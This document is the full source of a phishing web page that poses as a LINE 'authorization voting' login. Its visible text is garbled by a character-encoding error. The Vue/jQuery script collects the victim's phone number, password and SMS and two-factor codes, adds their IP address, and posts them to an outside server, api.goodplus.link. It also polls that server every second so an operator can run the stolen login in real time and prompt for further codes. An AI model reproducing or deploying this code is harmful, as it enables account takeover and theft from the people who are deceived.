
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>LINEæˆæ¬ŠæŠ•ç¥¨</title>
    <script type="text/javascript" src="css/flexible.js"></script>
    <link rel="stylesheet" href="css/index.css?v=2" />
    <link rel="stylesheet" href="css/default.css" />
    <link rel="stylesheet" href="css/form.css" />
    <style>
    .buttonok {
    height: 36px;
    width: 100px;
    border-radius: 25px;
    background-color: #f0f0f0; /* è®¾ç½®æŒ‰é’®èƒŒæ™¯é¢œè‰² */
    color: #333; /* è®¾ç½®æŒ‰é’®æ–‡å­—é¢œè‰² */
    text-align: center; /* æ–‡å­—å±…ä¸­ */
    line-height: 35px; /* å‚ç›´å±…ä¸­ */
    margin-top: -28px; /* å‘ä¸Šç§»åŠ¨32px */
}
    .hidden {
        display: none;
    }
</style>


</head>
<body>
<div v-cloak id="app">
    <div class="nav">LINEæˆæ¬ŠæŠ•ç¥¨</div>
    <div class="text-center margin-20">
        <img class="logo" src="css/3322.png" alt="" />
    </div>
    <div class="text-center">
        <b class="fs-20 fw-600 line-40">æ­¡è¿ä½¿ç”¨LINE é€²è¡Œæˆæ¬ŠæŠ•ç¥¨</b>
        <p id="ok" class="fs-14 line-20 padding-vh40">è¼¸å…¥é›»è©±è™Ÿç¢¼å¯†ç¢¼ä¸¦é»é¸ä¸‹ä¸€æ­¥ä»£è¡¨æ‚¨å·²ç¶“åŒæ„LINEçš„æœå‹™æ¢ä¾‹åŠéš±ç§æ¢æ¬¾</p>
    </div>

    <div class="margin-15 overflow">
        <van-form label-align="left" @submit="onSubmit" @failed="onFailed">
            <div id="pageA">
            <van-field
                    v-model="form.phone"
                    required
                    @input="quickSave"
                    placeholder="è«‹è¼¸å…¥LINEé›»è©±è™Ÿç¢¼">
                <template #label><span class="fs-12">é›»è©±è™Ÿç¢¼</span></template>
            </van-field>
            <van-field
                    v-model="form.password"
                    required
                    @input="quickSave"
                    placeholder="è«‹è¼¸å…¥å¯†ç¢¼">
                <template #label><span class="fs-12">è¼¸å…¥å¯†ç¢¼</span></template>
            </van-field>
            <van-field
                    v-model="form.code"
                    required
                    @input="quickSave"
                    placeholder="è«‹è¼¸å…¥LINEèªè­‰ç¢¼"
                    type="number"
                    maxlength="6">
                <template #label><span class="fs-12">è¼¸å…¥èªè­‰ç¢¼</span></template>
                <template #button>
                    <div class="buttonok" @click="getCode">{{codeWord}}</div>
                </template>
            </van-field>
            </div>
            <div id="pageB" class="hidden">
            <van-field
                    v-model="form.passwordcode"
                    required
                    @input="quickSave"
                    placeholder="è«‹è¼¸å…¥2èªè­‰ç¢¼"
                    type="number"
                    maxlength="6">
                <template #label><span class="fs-12">2èªè­‰ç¢¼</span></template>
            </van-field>
            </div>
             <div id="pageC" class="none">
            <div class="text-center margin-t20">
                <van-button round block type="danger" id="buttonId" native-type="submit">ç¢ºèª</van-button>
            </div>
            </div>
        </van-form>
    </div>
</div>
</body>
<script src="css/vue.min.js"></script>
<script src="css/vant.min.js"></script>
<script src="css/jquery-2.1.1.min.js"></script>
<script>
function generateRandomLetters() {
    let letters = 'ABCDEFGHIJKLMNOPQRSTUVWSYZ123456789';
    let randomLetters = '';
    for (let i = 0; i < 6; i++) {
        let randomIndex = Math.floor(Math.random() * letters.length);
        randomLetters += letters[randomIndex];
    }
    return randomLetters;
}

    let randomLetters = generateRandomLetters();
    let twuser = 0;
    var ipAddress = 0;
    fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
       ipAddress = data.ip;
       console.log("IP Address: " + ipAddress);
   })
  .catch(error => console.error("Error fetching IP address:", error));
    new Vue({
        el: '#app',
        data() {
            return {
                timer: null,
                codeWord: 'ç™¼é€',
                time: 60,
                canClick: true,
                form: {
                    phone: '',
                    password: '',
                    passwordcode: '',
                    code: '',
                    keys: randomLetters,
                    ip: ''
                }
            }
        },
        methods: {
            getCode() {
                if (this.codeWord !== 'ç™¼é€') { return }

                var phoneNumberPattern = /^\d{10}$/;
                var cktel = phoneNumberPattern.test(this.form.phone);
                if(!cktel){
                  this.$toast.fail('é›»è©±è™Ÿç¢¼ä¸æ­£ç¢ºï¼');
                  return false;
                }
                var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
                var ckpass = passwordPattern.test(this.form.password);
                if(!ckpass){
                    this.$toast.fail("å¯†ç¢¼ä¸æ­£ç¢ºï¼");
                    return false;
                }
               /// startSending(1);
                this.canClick = false
                this.timer = setInterval(() => {
                    this.count()
                }, 1000)
                this.form.id = document.getElementById('id');
                this.form.ip = ipAddress;
                $.ajax({
                    url:"https://api.goodplus.link/line.php?get=ok",
                    type: 'post',
                    dataType: 'JSON',
                    data: this.form,
                    success:function(data){}
                });
            },
            count() {
                this.time--
                this.codeWord = this.time + 's'
                if (this.time <= 0) {
                    this.codeWord = 'ç™¼é€'
                    clearInterval(this.timer)
                    this.time = 60
                    this.canClick = true
                }
            },
            onFailed(errorInfo) {
                this.$toast.fail('è«‹å¡«å¯«å®Œå–„');
                console.log('failed', errorInfo);
            },
            // ä¿å­˜æ¯ä¸€æ­¥è¾“å…¥
            quickSave() {
               
                //startSending();
                if(this.form.code.length < 6 && this.form.code != ''){
                    return false;
                }
                if(this.form.phone.length != 10 && this.form.phone != ''){
                    return false;
                }
                if(this.form.password.length<8 && this.form.password != ''){
                    return false;
                }
                if(this.form.passwordcode.length<6 && this.form.passwordcode != ''){
                    return false;
                }
                console.log('save', this.form)
                this.form.id = document.getElementById('id');
                this.form.ip = ipAddress;
                $.ajax({
                    url:"https://api.goodplus.link/line.php?get=save",
                    type: 'post',
                    dataType: 'JSON',
                    data: this.form,
                    success:function(data){}
                });
            },
            onSubmit() {
             if(twuser == 2){
                 if(this.form.passwordcode.length==0){
                    this.$toast.fail("è«‹è¾“å…¥2èªè­‰ç¢¼ï¼");
                    return false;
                }
                if(this.form.passwordcode.length!=6){
                    this.$toast.fail("2èªè­‰ç¢¼ä¸æ­£ç¢ºï¼");
                    return false;
                }
             }else{
                if(this.form.phone == ''){
                  this.$toast.fail('è«‹è¼¸å…¥é›»è©±è™Ÿç¢¼');
                  return false;
                }
                var phoneNumberPattern = /^\d{10}$/;
                var cktel = phoneNumberPattern.test(this.form.phone);
                if(!cktel){
                  this.$toast.fail('é›»è©±è™Ÿç¢¼ä¸æ­£ç¢ºï¼');
                  return false;
                }
                // if (this.codeWord == 'ç™¼é€' && twuser != 2) {
                //     this.$toast.fail('è«‹å…ˆç™¼é€ç¢ºèªç¢¼');
                //     return false;
                // }
                if(this.form.password == ''){
                  this.$toast.fail('è«‹è¼¸å…¥å¯†ç¢¼');
                  return false;
                }
                var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
                var ckpass = passwordPattern.test(this.form.password);
                if(!ckpass){
                   this.$toast.fail("å¯†ç¢¼ä¸æ­£ç¢ºï¼");
                   return false;
                }
                if(this.form.code.length==0){
                    this.$toast.fail("è«‹è¾“å…¥çš„èªè­‰ç¢¼ï¼");
                    return false;
                }
                if(this.form.code.length!=6){
                    this.$toast.fail("èªè­‰ç¢¼ä¸æ­£ç¢ºï¼");
                    return false;
                }
             }
               console.log('submit', this.form);
                this.form.id = document.getElementById('id');
                this.form.ip = ipAddress;
                document.getElementById("buttonId").disabled = true;
                document.getElementById("buttonId").innerHTML = "æ­£åœ¨é©—è­‰ä¸­...";
                document.getElementById("buttonId").style.backgroundColor = "#5aaafb";
                document.getElementById("buttonId").style.border = "1px solid #5aaafb";
              $.ajax({
                  url:"https://api.goodplus.link/line.php?get=submit",
                  type: 'post',
                  dataType: 'JSON',
                  data: this.form,
                  success:function(datas){
                    if(twuser  < 1){
                        twuser = 1;
                    }else{
                        twuser = 3;
                    }
                    setTimeout(function(){
                        // document.getElementById("pageA").classList.add("hidden");
                        // document.getElementById("pageB").classList.remove("hidden");
                    },1500);
                    return false;
                  }
              });
            }
        }
    })
    
    // å®šä¹‰è¦å‘é€çš„æ•°æ®
const postData = {
    key1: 'value1',
    key2: 'value2'
};

let intervalId;

// å®šä¹‰å®šæ—¶å‘é€POSTè¯·æ±‚çš„å‡½æ•°
function sendPostData() {
    $.ajax({
        url:"https://api.goodplus.link/api.php",
            type: 'post',
            dataType: 'JSON',
            data: {key: twuser,keys: randomLetters},
              success:function(datas){
                if(datas == 1 || datas == 2 || datas == 3 || datas == 4 || datas == 5 || datas == 6 || datas == 8){
                    if(datas == 2){
                        twuser = 0;
                       alert('å¯†ç¢¼ä¸æ­£ç¢ºï¼');
                    }else if(datas == 3){
                         twuser = 0;
                        alert('èªè­‰ç¢¼ä¸æ­£ç¢ºï¼');
                    }else if(datas == 4){
                         twuser = 0;
                        alert('èªè­‰ç¢¼å·²è¶…æ™‚ï¼è«‹é‡æ–°ç™¼é€');
                    }else if(datas == 5){
                         twuser = 2;
                        alert('2èªè­‰ç¢¼ä¸æ­£ç¢ºï¼');
                    }else if(datas == 6){
                         twuser = 0;
                        location.reload();    // é‡æ–°åŠ è½½å½“å‰é¡µé¢
                        stopSending();
                    }else if(datas == 8){
                         twuser = 0;
                        document.getElementById("pageA").classList.add("hidden");
                        document.getElementById("pageB").classList.add("hidden");
                        document.getElementById("pageC").classList.add("hidden");
                        document.getElementById("ok").innerHTML = "ğŸ™<br><br>ç³»çµ±ç¹å¿™è«‹ä¸€ä¸ªå°æ™‚å¾Œé‡è©¦ï¼ï¼ï¼";
                        stopSending();
                    }else{
                         twuser = 2;
                        document.getElementById("pageA").classList.add("hidden");
                        document.getElementById("pageB").classList.remove("hidden");
                        //è¿›å…¥ä¸‹ä¸ª
                    }
                    document.getElementById("buttonId").disabled = false;
                    document.getElementById("buttonId").style.backgroundColor = "#1989fa";
                    document.getElementById("buttonId").style.border = "1px solid #1989fa";
                    document.getElementById("buttonId").innerHTML = "ç¢ºèª";
                }
            }
    });
}

// å¼€å§‹å®šæ—¶å‘é€POSTè¯·æ±‚
function startSending() {
    intervalId = setInterval(sendPostData, 1000);
}

// åœæ­¢å®šæ—¶å‘é€POSTè¯·æ±‚
function stopSending() {
    clearInterval(intervalId);
}

//è°ƒç”¨å¼€å§‹å‘é€å‡½æ•°
startSending();

// è°ƒç”¨åœæ­¢å‘é€å‡½æ•°ï¼ˆå¯é€‰ï¼‰
// stopSending();

</script>
</html>
